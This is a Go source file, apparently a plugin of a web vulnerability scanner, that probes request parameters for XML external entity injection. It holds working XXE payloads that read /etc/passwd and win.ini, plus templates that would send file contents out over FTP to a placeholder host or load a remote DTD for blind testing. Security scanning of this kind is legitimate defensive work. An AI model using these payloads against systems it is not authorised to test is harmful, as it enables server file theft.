package xxe

import (
	"errors"
	"fmt"
	"glint/nenet"
	"glint/pkg/layers"
	"glint/plugin"
	"glint/util"
	"time"

	"github.com/thoas/go-funk"
)

var DefaultProxy = ""
var Cert string
var Mkey string

var ftp_template = `<!ENTITY % bbb SYSTEM "file:///tmp/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`
var ftp_client_file_template = `<!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@%HOSTNAME%:%FTP_PORT%/b'>">`

// bind-xxe
var reverse_template = []string{
	`<!DOCTYPE convert [<!ENTITY % remote SYSTEM "%s">%remote;]>`,
	`<!DOCTYPE uuu SYSTEM "%s">`,
}

type classXxe struct {
	scheme layers.Scheme
	// InjectionPatterns      classInjectionPatterns
	TargetUrl            string
	inputIndex           int
	reflectionPoint      int
	disableSensorBased   bool
	currentVariation     int
	foundVulnOnVariation bool
	variations           *util.Variations
	lastJob              layers.LastJob
	VulnPayload          string
	lastJobProof         interface{}
	// injectionValidator     TInjectionValidator
	scanningWAVSEP         bool
	scanningOwaspBenchmark bool
	isUnix                 bool
	isWindows              bool
	isJava                 bool
	isUnknown              bool
	// IsSensorServerEnabled  bool
}

func (c *classXxe) ClearFeature() {
	if c.lastJob.Features != nil {
		c.lastJob.Features.Clear()
	}
}

func Xxe(args *plugin.GroupData) (*util.ScanResult, bool, error) {
	var err error
	var Param layers.PluginParam
	var ClassXxe classXxe
	var variations *util.Variations

	ct := layers.CheckType{}
	Param.ParsePluginParams(args, ct)
	if Param.CheckForExitSignal() {
		return nil, false, errors.New("receive task exit signal")
	}

	sess := nenet.GetSessionByOptions(
		&nenet.ReqOptions{
			Timeout:       time.Duration(Param.Timeout) * time.Second,
			RetryTimes:    Param.MaxRedirectTimes,
			AllowRedirect: false,
			Proxy:         Param.UpProxy,
			Cert:          Param.Cert,
			PrivateKey:    Param.CertKey,
		})

	ClassXxe.lastJob.Init(Param)
	gd := args
	// variations,err = util.ParseUri(url)
	// BlindSQL.variations =
	if value, ok := Param.Headers["Content-Type"]; ok {
		Param.ContentType = value
	}

	variations, err = util.ParseUri(Param.Url, []byte(Param.Body), Param.Method, Param.ContentType, Param.Headers)
	//赋值
	ClassXxe.variations = variations
	ClassXxe.lastJob.Layer.Sess = sess
	ClassXxe.TargetUrl = Param.Url
	ClassXxe.lastJob.Layer.Method = Param.Method
	ClassXxe.lastJob.Layer.ContentType = Param.ContentType
	ClassXxe.lastJob.Layer.Headers = Param.Headers
	ClassXxe.lastJob.Layer.Body = []byte(Param.Body)
	defer ClassXxe.ClearFeature()
	// defer func() {
	// 	if ClassXxe.lastJob.Features != nil {
	// 		ClassXxe.lastJob.Features.Clear()
	// 	}
	// }()
	//如果都没有报出漏洞的话，尝试Blind测试
	//首先，开启两个

	if ClassXxe.startTesting() {
		detail := fmt.Sprintf("Xxe inject vulnerability found. payload:%s", ClassXxe.VulnPayload)
		Result := util.VulnerableTcpOrUdpResult(Param.Url,
			detail,
			[]string{string(ClassXxe.lastJob.Features.Request.String())},
			[]string{string(ClassXxe.lastJob.Features.Response.String())},
			"high",
			Param.Hostid, string(plugin.Xxe))
		gd.Alert(Result)

		return Result, true, err
	}
	return nil, false, err
}

func (c *classXxe) startTesting() bool {

	payloads := []string{
		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>`,
		`<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>`,
		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///c:/windows/win.ini">]>`,
		`<?xml version = "1.0"?><!DOCTYPE ANY [      <!ENTITY f SYSTEM "file:///C://Windows//win.ini">  ]><x>&f;</x>`,
	}

	if c.variations != nil {
		for _, p := range c.variations.Params {
			//fmt.Println(p.Name, p.Value)
			if c.foundVulnOnVariation {
				break
			}
			for _, payload := range payloads {
				//s1 := strings.ReplaceAll(payload, "{domain}", _reverse.Url)
				opt := make(map[string]string)
				opt["encode"] = "encode"
				report, err := c.lastJob.RequestByIndex(p.Index, c.TargetUrl, []byte(payload), opt)
				if err != nil {
					continue
				}
				if funk.Contains(report.Response.String(), "root:[x*]:0:0:") || funk.Contains(report.Response.String(), "; for 16-bit app support") {
					c.VulnPayload = payload
					return true
				}
			}
		}
	}

	return false
}
